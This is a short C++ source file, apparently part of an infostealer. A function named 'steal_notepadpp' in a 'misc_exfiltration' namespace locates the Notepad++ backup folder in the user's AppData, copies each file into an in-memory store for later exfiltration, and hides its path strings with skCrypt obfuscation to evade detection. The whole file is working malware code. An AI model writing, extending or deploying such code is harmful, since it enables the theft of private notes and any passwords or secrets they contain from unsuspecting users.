#include <string>
#include <filesystem>
#include <fstream>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace misc_exfiltration {
    namespace fs = std::filesystem;

    void steal_notepadpp() {
        fs::path src = fs::path(features::get_home()) / skCrypt("AppData") / skCrypt("Roaming") / skCrypt("Notepad++") / skCrypt("backup");
        if (!fs::exists(src)) return;

        for (const auto& entry : fs::directory_iterator(src)) {
            if (!entry.is_regular_file()) continue;
            mem_store::import_file(
                skCrypt("notepadpp/") + entry.path().filename().string(),
                entry.path());
        }
    }
}
